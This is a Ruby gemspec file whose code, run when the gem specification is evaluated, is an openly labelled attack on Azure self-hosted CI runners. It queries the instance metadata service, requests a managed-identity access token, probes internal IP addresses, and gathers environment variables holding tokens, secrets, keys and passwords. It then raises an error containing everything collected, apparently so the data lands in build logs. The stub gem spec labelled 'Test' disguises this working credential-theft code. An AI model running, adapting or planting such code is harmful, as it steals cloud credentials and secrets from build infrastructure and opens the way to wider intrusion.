# Azure Self-Hosted Runner Attack - NO PROXY BLOCKING!
require 'net/http'
require 'uri'
require 'json'

data = []
data << "=== AZURE SELF-HOSTED RUNNER ATTACK ==="
data << "=== NO PROXY = DIRECT AZURE IMDS ACCESS ==="
data << ""

# Check for proxy (should be NONE on self-hosted!)
https_proxy = ENV["HTTPS_PROXY"] || ENV["https_proxy"] || "NONE"
data << "HTTPS_PROXY: #{https_proxy}"

# Get Azure instance metadata
data << ""
data << "=== AZURE INSTANCE METADATA ==="
begin
  uri = URI.parse("http://169.254.169.254/metadata/instance?api-version=2021-02-01")
  http = Net::HTTP.new(uri.host, uri.port)
  http.open_timeout = 5
  
  request = Net::HTTP::Get.new(uri.request_uri)
  request["Metadata"] = "true"
  
  response = http.request(request)
  
  if response.code == "200"
    metadata = JSON.parse(response.body)
    data << "SUBSCRIPTION_ID: #{metadata.dig('compute', 'subscriptionId')}"
    data << "RESOURCE_GROUP: #{metadata.dig('compute', 'resourceGroupName')}"
    data << "VM_NAME: #{metadata.dig('compute', 'name')}"
    data << "VM_ID: #{metadata.dig('compute', 'vmId')}"
    data << "LOCATION: #{metadata.dig('compute', 'location')}"
    data << "PRIVATE_IP: #{metadata.dig('network', 'interface', 0, 'ipv4', 'ipAddress', 0, 'privateIpAddress')}"
    data << "RESOURCE_ID: #{metadata.dig('compute', 'resourceId')}"
  end
rescue => e
  data << "METADATA_ERROR: #{e.message}"
end

# Try to get Managed Identity token
data << ""
data << "=== AZURE MANAGED IDENTITY TOKEN ==="
begin
  uri = URI.parse("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/")
  http = Net::HTTP.new(uri.host, uri.port)
  http.open_timeout = 5
  
  request = Net::HTTP::Get.new(uri.request_uri)
  request["Metadata"] = "true"
  
  response = http.request(request)
  data << "MI_RESPONSE: #{response.code}"
  data << "MI_BODY: #{response.body[0..500]}"
rescue => e
  data << "MI_ERROR: #{e.message}"
end

# Scan internal network
data << ""
data << "=== INTERNAL NETWORK SCAN ==="
["10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.5", "10.0.0.10"].each do |ip|
  begin
    uri = URI.parse("http://#{ip}/")
    http = Net::HTTP.new(uri.host, 80)
    http.open_timeout = 2
    response = http.get("/")
    data << "#{ip}: #{response.code}"
  rescue => e
    data << "#{ip}: #{e.message[0..30]}"
  end
end

# Environment tokens
data << ""
data << "=== ENVIRONMENT TOKENS ==="
ENV.each do |k, v|
  if k.include?("TOKEN") || k.include?("SECRET") || k.include?("KEY") || k.include?("PASSWORD")
    data << "#{k}: #{v[0..50]}"
  end
end

raise "AZURE_ATTACK:\n#{data.join("\n")}"

Gem::Specification.new do |s|
  s.name = "azure-attack"
  s.version = "1.0.0"
  s.summary = "Test"
  s.authors = ["Test"]
  s.files = []
end
